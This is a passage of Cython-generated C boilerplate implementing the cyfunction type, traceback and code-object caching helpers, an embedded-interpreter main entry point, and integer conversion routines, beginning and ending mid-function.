            result = op->defaults_kwdict;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value || value == Py_None) {
        value = NULL;
    } else if (!PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__annotations__ must be set to a dict object");
        return -1;
    }
    Py_XINCREF(value);
    tmp = op->func_annotations;
    op->func_annotations = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->func_annotations;
    if (unlikely(!result)) {
        result = PyDict_New();
        if (unlikely(!result)) return NULL;
        op->func_annotations = result;
    }
    Py_INCREF(result);
    return result;
}
static PyGetSetDef __pyx_CyFunction_getsets[] = {
    {(char *) "func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},
    {(char *) "__self__", (getter)__Pyx_CyFunction_get_self, 0, 0, 0},
    {(char *) "func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},
    {(char *) "__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},
    {0, 0, 0, 0, 0}
};
static PyMemberDef __pyx_CyFunction_members[] = {
    {(char *) "__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), PY_WRITE_RESTRICTED, 0},
    {0, 0, 0,  0, 0}
};
static PyObject *
__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, CYTHON_UNUSED PyObject *args)
{
#if PY_MAJOR_VERSION >= 3
    Py_INCREF(m->func_qualname);
    return m->func_qualname;
#else
    return PyString_FromString(m->func.m_ml->ml_name);
#endif
}
static PyMethodDef __pyx_CyFunction_methods[] = {
    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},
    {0, 0, 0, 0}
};
#if PY_VERSION_HEX < 0x030500A0
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)
#else
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func.m_weakreflist)
#endif
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,
                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    if (unlikely(op == NULL))
        return NULL;
    op->flags = flags;
    __Pyx_CyFunction_weakreflist(op) = NULL;
    op->func.m_ml = ml;
    op->func.m_self = (PyObject *) op;
    Py_XINCREF(closure);
    op->func_closure = closure;
    Py_XINCREF(module);
    op->func.m_module = module;
    op->func_dict = NULL;
    op->func_name = NULL;
    Py_INCREF(qualname);
    op->func_qualname = qualname;
    op->func_doc = NULL;
    op->func_classobj = NULL;
    op->func_globals = globals;
    Py_INCREF(op->func_globals);
    Py_XINCREF(code);
    op->func_code = code;
    op->defaults_pyobjects = 0;
    op->defaults_size = 0;
    op->defaults = NULL;
    op->defaults_tuple = NULL;
    op->defaults_kwdict = NULL;
    op->defaults_getter = NULL;
    op->func_annotations = NULL;
    return (PyObject *) op;
}
static int
__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)
{
    Py_CLEAR(m->func_closure);
    Py_CLEAR(m->func.m_module);
    Py_CLEAR(m->func_dict);
    Py_CLEAR(m->func_name);
    Py_CLEAR(m->func_qualname);
    Py_CLEAR(m->func_doc);
    Py_CLEAR(m->func_globals);
    Py_CLEAR(m->func_code);
    Py_CLEAR(m->func_classobj);
    Py_CLEAR(m->defaults_tuple);
    Py_CLEAR(m->defaults_kwdict);
    Py_CLEAR(m->func_annotations);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_XDECREF(pydefaults[i]);
        PyObject_Free(m->defaults);
        m->defaults = NULL;
    }
    return 0;
}
static void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    if (__Pyx_CyFunction_weakreflist(m) != NULL)
        PyObject_ClearWeakRefs((PyObject *) m);
    __Pyx_CyFunction_clear(m);
    PyObject_GC_Del(m);
}
static void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    PyObject_GC_UnTrack(m);
    __Pyx__CyFunction_dealloc(m);
}
static int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)
{
    Py_VISIT(m->func_closure);
    Py_VISIT(m->func.m_module);
    Py_VISIT(m->func_dict);
    Py_VISIT(m->func_name);
    Py_VISIT(m->func_qualname);
    Py_VISIT(m->func_doc);
    Py_VISIT(m->func_globals);
    Py_VISIT(m->func_code);
    Py_VISIT(m->func_classobj);
    Py_VISIT(m->defaults_tuple);
    Py_VISIT(m->defaults_kwdict);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_VISIT(pydefaults[i]);
    }
    return 0;
}
static PyObject *__Pyx_CyFunction_descr_get(PyObject *func, PyObject *obj, PyObject *type)
{
#if PY_MAJOR_VERSION < 3
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    if (m->flags & __Pyx_CYFUNCTION_STATICMETHOD) {
        Py_INCREF(func);
        return func;
    }
    if (m->flags & __Pyx_CYFUNCTION_CLASSMETHOD) {
        if (type == NULL)
            type = (PyObject *)(Py_TYPE(obj));
        return __Pyx_PyMethod_New(func, type, (PyObject *)(Py_TYPE(type)));
    }
    if (obj == Py_None)
        obj = NULL;
#endif
    return __Pyx_PyMethod_New(func, obj, type);
}
static PyObject*
__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)
{
#if PY_MAJOR_VERSION >= 3
    return PyUnicode_FromFormat("<cyfunction %U at %p>",
                                op->func_qualname, (void *)op);
#else
    return PyString_FromFormat("<cyfunction %s at %p>",
                               PyString_AsString(op->func_qualname), (void *)op);
#endif
}
static PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {
    PyCFunctionObject* f = (PyCFunctionObject*)func;
    PyCFunction meth = f->m_ml->ml_meth;
    Py_ssize_t size;
    switch (f->m_ml->ml_flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {
    case METH_VARARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0))
            return (*meth)(self, arg);
        break;
    case METH_VARARGS | METH_KEYWORDS:
        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);
    case METH_NOARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 0))
                return (*meth)(self, NULL);
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    case METH_O:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 1)) {
                PyObject *result, *arg0;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                arg0 = PyTuple_GET_ITEM(arg, 0);
                #else
                arg0 = PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;
                #endif
                result = (*meth)(self, arg0);
                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
                Py_DECREF(arg0);
                #endif
                return result;
            }
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags in "
                        "__Pyx_CyFunction_Call. METH_OLDARGS is no "
                        "longer supported!");
        return NULL;
    }
    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",
                 f->m_ml->ml_name);
    return NULL;
}
static CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    return __Pyx_CyFunction_CallMethod(func, ((PyCFunctionObject*)func)->m_self, arg, kw);
}
static PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {
    PyObject *result;
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        Py_ssize_t argc;
        PyObject *new_args;
        PyObject *self;
        argc = PyTuple_GET_SIZE(args);
        new_args = PyTuple_GetSlice(args, 1, argc);
        if (unlikely(!new_args))
            return NULL;
        self = PyTuple_GetItem(args, 0);
        if (unlikely(!self)) {
            Py_DECREF(new_args);
#if PY_MAJOR_VERSION > 2
            PyErr_Format(PyExc_TypeError,
                         "unbound method %.200S() needs an argument",
                         cyfunc->func_qualname);
#else
            PyErr_SetString(PyExc_TypeError,
                            "unbound method needs an argument");
#endif
            return NULL;
        }
        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);
        Py_DECREF(new_args);
    } else {
        result = __Pyx_CyFunction_Call(func, args, kw);
    }
    return result;
}
static PyTypeObject __pyx_CyFunctionType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
    (destructor) __Pyx_CyFunction_dealloc,
    0,
    0,
    0,
#if PY_MAJOR_VERSION < 3
    0,
#else
    0,
#endif
    (reprfunc) __Pyx_CyFunction_repr,
    0,
    0,
    0,
    0,
    __Pyx_CyFunction_CallAsMethod,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,
    0,
    (traverseproc) __Pyx_CyFunction_traverse,
    (inquiry) __Pyx_CyFunction_clear,
    0,
#if PY_VERSION_HEX < 0x030500A0
    offsetof(__pyx_CyFunctionObject, func_weakreflist),
#else
    offsetof(PyCFunctionObject, m_weakreflist),
#endif
    0,
    0,
    __pyx_CyFunction_methods,
    __pyx_CyFunction_members,
    __pyx_CyFunction_getsets,
    0,
    0,
    __Pyx_CyFunction_descr_get,
    0,
    offsetof(__pyx_CyFunctionObject, func_dict),
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_CyFunction_init(void) {
    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);
    if (unlikely(__pyx_CyFunctionType == NULL)) {
        return -1;
    }
    return 0;
}
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults = PyObject_Malloc(size);
    if (unlikely(!m->defaults))
        return PyErr_NoMemory();
    memset(m->defaults, 0, size);
    m->defaults_pyobjects = pyobjects;
    m->defaults_size = size;
    return m->defaults;
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_tuple = tuple;
    Py_INCREF(tuple);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_kwdict = dict;
    Py_INCREF(dict);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->func_annotations = dict;
    Py_INCREF(dict);
}

/* CythonFunction */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,
                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    PyObject *op = __Pyx_CyFunction_Init(
        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),
        ml, flags, qualname, closure, module, globals, code
    );
    if (likely(op)) {
        PyObject_GC_Track(op);
    }
    return op;
}

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
    }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(WIN32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    /* Some platforms have a broken implementation of
     * mbstowcs which does not count the characters that
     * would result from conversion.  Use an upper bound.
     */
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            /* Only use the result if it contains no
               surrogate characters. */
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    /* Overallocate; as multi-byte characters are in the argument, the
       actual output could use less memory. */
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            /* Incomplete character. This should never happen,
               since we provide everything that we have -
               unless there is a bug in the C library, or I
               misunderstood how mbrtowc works. */
            fprintf(stderr, "unexpected mbrtowc result -2\\n");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            /* Conversion error. Escape as UTF-8b, and start over
               in the initial shift state. */
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            /* Surrogate character.  Escape the original
               byte sequence with surrogateescape. */
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    /* Cannot use C locale for escaping; manually escape as if charset
       is ASCII (i.e. escape all bytes > 128. This will still roundtrip
       correctly in the locale's charset, which must be an ASCII superset. */
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory\\n");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory\\n");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif

/* CIntToPy */
    static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
    #define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
    static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
